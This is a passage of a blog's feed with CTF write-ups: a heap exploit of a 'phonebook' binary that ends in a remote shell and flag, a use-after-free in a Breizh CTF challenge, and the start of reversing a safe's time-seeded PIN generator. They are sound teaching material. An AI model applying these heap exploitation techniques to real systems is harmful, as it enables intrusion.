0x559b0d4d1810	0x6161616161616161	0x6161616161616161	aaaaaaaaaaaaaaaa
0x559b0d4d1820	0x0000000000000000	0x0000000000000031	........1.......
0x559b0d4d1830	0x3131313131313131	0x0000559b0c84f2a1	11111111.....U..
0x559b0d4d1840	0x0000559b0c851fa0	0x000000000000000a	.....U..........
0x559b0d4d1850	0x0000000000000000	0x000000000001f7b1	................	 &lt;-- Top chunk
</code></pre><p>The <code>edit_phone_number</code> overwrites the null byte:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">edit_phone_number</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter new phone number: &#34;</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%8s&#34;</span><span class="p">,</span> <span class="n">people</span><span class="p">[</span><span class="n">a1</span><span class="p">]);</span>
<span class="p">}</span>
</code></pre></div><p>To summarise:</p>
<ul>
<li>leak binary base address by overwriting the null byte (<code>edit_phone_number</code>) and then print the phone numer.</li>
<li>leak libc base address by overwriting the name field of the second entity with the got entry of <code>puts</code></li>
</ul>
<div class="gblog-post__anchorwrap">
    <h2 id="profit">
        PROFIT
        <a data-clipboard-text="https://nasm.re/posts/phonebook/#profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor PROFIT" href="#profit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Then we just have to overwrite the function pointer with the address of <code>system</code> which takes as first argument a pointer to the entity structure of edit the phone number of the entity we wanna use because that&rsquo;s the first field of the structure which means we make it equivalent to a <code>system(&quot;/bin/sh&quot;)</code>.</p>
<pre tabindex="0"><code>00000000 entity          struc ; (sizeof=0x20, mappedto_8)
00000000 num             dq ?
00000008 func            dq ?
00000010 name            dq ?                    ; offset
00000018 name_size       dq ?
00000020 entity          ends
</code></pre><p>Then here we are:</p>
<pre tabindex="0"><code>$ python3 exploit.py REMOTE HOST=51.124.222.205 PORT=13380
[*] '/home/nasm/Documents/phonebook/chall/phonebook_patched_patched'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
[+] Opening connection to 51.124.222.205 on port 13380: Done
[*] binary: 0x558980fdd000
[*] libc @ 0x7fabfec57000
[*] system @ 0x7fabfeca92c0
[*] Switching to interactive mode
$ id
uid=1337 gid=1337 groups=1337
$ cat flag.txt
DCTF{C4n_1_g3t_y0ur_numb3r?}
</code></pre>]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/heap" term="heap" label="heap" />
                             
                                <category scheme="https://nasm.re/tags/dctf" term="dctf" label="dctf" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[Breizh CTF 2022 - pwn] Faible Ty Reseau]]></title>
            <link href="https://nasm.re/posts/ftm/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/ftm/</id>
            
            <published>2022-03-04T00:00:00+00:00</published>
            <updated>2022-03-04T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<p>Faible Ty Réseau is a basic heap-like challenge, it allows us to create a configuration, edit it, call a function pointer on it and finally to free it:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v5</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="n">aVousN</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="n">a1ModifierLesPa</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">argv</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">;</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_21F3</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
    <span class="k">switch</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;wtf ?&#34;</span><span class="p">);</span>
        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
        <span class="n">create</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
        <span class="n">delete</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
        <span class="n">exec</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
        <span class="n">show</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
      <span class="k">default</span><span class="o">:</span>
        <span class="k">continue</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>They are many ways to pwn the challenge, I did it by taking advantage of the UAF in <code>create</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kr">__int64</span> <span class="nf">create</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-1Ch]
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-18h]
</span><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]
</span><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
</span><span class="c1"></span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">ptr</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">ptr</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18uLL</span><span class="p">);</span>
    <span class="n">byte_4104</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">buf</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mh">0x19uLL</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&#34;New hostname : &#34;</span><span class="p">,</span> <span class="mh">0x10uLL</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x18uLL</span><span class="p">);</span>
  <span class="o">*</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mh">0x19uLL</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">New host : &#34;</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">v4</span><span class="p">,</span> <span class="mh">0x18uLL</span><span class="p">);</span>
  <span class="o">*</span><span class="p">(</span><span class="n">v4</span> <span class="o">+</span> <span class="n">v2</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">byte_4104</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="n">realloc</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">v1</span> <span class="o">+</span> <span class="n">v2</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
    <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="n">sub_1259</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">byte_4104</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="n">sub_1259</span><span class="p">;</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">alloc_admin</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>As we can see, if ptr is not <code>NULL</code> and that we enter only one byte for each read (by sending only \n for example), then we will trigger a <code>realloc(ptr, 1 + 1 - 2)</code> which frees <code>ptr</code>, <code>ptr</code> being freed the freelist is pointing on <code>ptr</code>. Now let&rsquo;s take a look at the <code>alloc_admin</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kr">__int64</span> <span class="nf">alloc_admin</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-10h]
</span><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">qword_40F8</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18uLL</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0xAuLL</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="s">&#34;Admin&#34;</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0xAuLL</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span> <span class="s">&#34;000000000&#34;</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="o">*</span><span class="n">qword_40F8</span> <span class="o">=</span> <span class="n">v1</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">qword_40F8</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">qword_40F8</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="n">win</span><span class="p">;</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>By allocating <code>0x18</code> bytes, it gets the previous freed <code>ptr</code> and writes over a few fields like the function pointer. Then we just have to call the <code>exec</code> function which will call the win function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">exec</span><span class="p">()</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">ptr</span> <span class="p">)</span>
    <span class="k">return</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">2</span><span class="p">))();</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Pas de configuration !&#34;</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>Which gives us:</p>
<pre tabindex="0"><code>nasm@off:~/ctf/bzhCTF/pwn$ ./FTM
Vous n'êtes pas connecté (anonyme)
1. Modifier les paramètres de connexion
2. Restaurer la configutation d'usine
3. Tester la configuration
4. Voir la configuration courante
5. Quitter (au revoir !)
&gt;&gt;&gt;&gt; 1
New hostname : dumb

New host : dumb
Vous n'êtes pas connecté (anonyme)
1. Modifier les paramètres de connexion
2. Restaurer la configutation d'usine
3. Tester la configuration
4. Voir la configuration courante
5. Quitter (au revoir !)
&gt;&gt;&gt;&gt; 1
New hostname : 

New host : 
Vous n'êtes pas connecté (anonyme)
1. Modifier les paramètres de connexion
2. Restaurer la configutation d'usine
3. Tester la configuration
4. Voir la configuration courante
5. Quitter (au revoir !)
&gt;&gt;&gt;&gt; 3
BZHCTF{9024b719d4449bc9827478e50f0279427ccb542cc3ecdec21fce38c52b29561c}
</code></pre>]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/ret2school" term="ret2school" label="ret2school" />
                             
                                <category scheme="https://nasm.re/tags/Breizh-CTF" term="Breizh-CTF" label="Breizh CTF" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/2022" term="2022" label="2022" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[TRACS 2021 - RE] Coffre]]></title>
            <link href="https://nasm.re/posts/safe/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/safe/</id>
            
            <published>2021-12-05T00:00:00+00:00</published>
            <updated>2021-12-05T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h2 id="intro">
        Intro
        <a data-clipboard-text="https://nasm.re/posts/safe/#intro" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Intro" href="#intro">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<blockquote>
<p>Epreuve 12-3 – Coffre
En tant que stagiaire vous avez accès aux locaux de la NSB. Vous allez collecter des informations dans les locaux. Un coffre est présent dans les locaux en salle rideau. Il appartient à Richard Cresus de la Tune. Essayez d’ouvrir ce coffre. Quel est l’IBAN contenu dans le coffre ? Format de la réponse : IBAN sans séparateur.</p>
</blockquote>
<p>Basically, we have to crack open an electronic safe. It&rsquo;s locked with an electromagnet and requires a pin to open, moreover it prints an id right before asking for the pin. We previously were given a link to the download page one of the safe&rsquo;s software update (<code>http://safe-locks.tracs.viarezo.fr/download</code>).</p>
<div class="gblog-post__anchorwrap">
    <h2 id="reversing-the-custom-libcryptoso-library">
        Reversing the custom libcrypto.so library
        <a data-clipboard-text="https://nasm.re/posts/safe/#reversing-the-custom-libcryptoso-library" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Reversing the custom libcrypto.so library" href="#reversing-the-custom-libcryptoso-library">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>The software update comes in the from of a <code>.maj</code> archive that we extracted to get two <code>libcrypto.so</code> libraries (one for x86, the other one for arm64 v7). We checked if the files were equivalent by looking at their code structure, and we finally choose to reverse the x86 library (even though the safe probably used the arm one) because it was easier.</p>
<p>Firstly, we looked at how the pin was checked, more specifically at the <code>libsafe_test_passcode</code> in IDA:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">_BOOL8</span> <span class="kr">__fastcall</span> <span class="nf">libsafe_test_passcode</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// eax
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-64h]
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">36</span><span class="p">];</span> <span class="c1">// [rsp+20h] [rbp-60h] BYREF
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">s1</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span> <span class="c1">// [rsp+50h] [rbp-30h] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+78h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v6</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;.safe_db&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
    <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x24uLL</span><span class="p">);</span>
  <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">a1</span><span class="p">);</span>
  <span class="n">sha256sum</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">v2</span><span class="p">,</span> <span class="n">s1</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">memcmp</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="mh">0x20uLL</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>We assume the argument is a pointer to the pin, for which we compute its <code>sha256sum</code>. And if it is equal to <code>buf[4:0x24]</code>, it means the pin correct! So we have to understand what <code>buf[4:0x24]</code> is, which is stored in the <code>.safe_db</code> file. To do so we look at the <code>libsafe_generate_new_passcode</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">libsafe_generate_new_passcode</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// eax
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-468h]
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-464h]
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">file_content</span><span class="p">[</span><span class="mi">36</span><span class="p">];</span> <span class="c1">// [rsp+20h] [rbp-460h] BYREF
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">hash_rand_buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="c1">// [rsp+50h] [rbp-430h] BYREF
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">rand_buf</span><span class="p">[</span><span class="mi">1032</span><span class="p">];</span> <span class="c1">// [rsp+70h] [rbp-410h] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">canary</span><span class="p">;</span> <span class="c1">// [rsp+478h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">canary</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">time</span><span class="p">(</span><span class="mi">0LL</span><span class="p">);</span>
  <span class="n">srand</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">file_content</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">file_content</span><span class="p">));</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">file_content</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">1023</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
    <span class="n">rand_buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
  <span class="n">sha256sum</span><span class="p">(</span><span class="n">rand_buf</span><span class="p">,</span> <span class="mi">1024LL</span><span class="p">,</span> <span class="n">hash_rand_buf</span><span class="p">);</span>
  <span class="n">_build_passcode</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">hash_rand_buf</span><span class="p">,</span> <span class="mi">32LL</span><span class="p">,</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">a1</span><span class="p">,</span> <span class="mi">8LL</span><span class="p">);</span>
  <span class="n">sha256sum</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="mi">8LL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">file_content</span><span class="p">[</span><span class="mi">4</span><span class="p">]);</span>
  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;.safe_db&#34;</span><span class="p">,</span> <span class="mi">577</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
    <span class="k">return</span> <span class="mi">1LL</span><span class="p">;</span>
  <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">file_content</span><span class="p">,</span> <span class="mh">0x24uLL</span><span class="p">);</span>
  <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>The function is very basic:</p>
<ul>
<li>It takes as argument a pointer to the buffer to cipher for which we compute the hash to fill out the <code>.safe_db</code> file.</li>
<li>It initializes the PRNG with <code>time(NULL)</code> passed as an argument to<code>srand</code>. It then creates an array of <code>1024</code> random bytes with the use of <code>rand</code>.</li>
<li>Then, this array is hashed with <code>sha256sum</code> and its hash is given to the <code>_build_passcode</code> function. The result is stored in the <code>a1</code> argument.</li>
<li>The argument is hashed again and in the target file we write at <code>file_content[:4]</code> the first <code>rand</code> value and at <code>file_content[4:0x24]</code> the hash of the previous ciphered buffer.</li>
</ul>
<p>The core of the encryption algorithm is in the <code>build_passcode</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">build_passcode</span><span class="p">(</span>
        <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="n">hash_rand_buf</span><span class="p">,</span>
        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">length_hash</span><span class="p">,</span>
        <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="n">out</span><span class="p">,</span>
        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">opaque_8</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-10h]
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">length_base</span><span class="p">;</span> <span class="c1">// [rsp+24h] [rbp-Ch]
</span><span class="c1"></span>
  <span class="n">lenght_base</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="s">&#34;1234567890ABCD&#34;</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="n">opaque_8</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="n">out</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">base</span><span class="p">[</span><span class="n">hash_rand_buf</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">length_hash</span><span class="p">]</span> <span class="o">%</span> <span class="n">length_base</span><span class="p">];</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>That&rsquo;s just basically filling out the <code>out</code> buffer with <code>base[hash_rand_buf[i % length_hash] % lenght_base]</code>.</p>
<p>Now we have a good understanding of the encryption algorithm, we can take a look at what exactly the <code>id</code> printed right before the pin input is. The function that generates the <code>id</code> is <code>libsafe_get_userid</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">libsafe_get_userid</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="n">id</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-34h]
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span> <span class="c1">// [rsp+20h] [rbp-30h] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+48h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;.safe_db&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
    <span class="k">return</span> <span class="mi">1LL</span><span class="p">;</span>
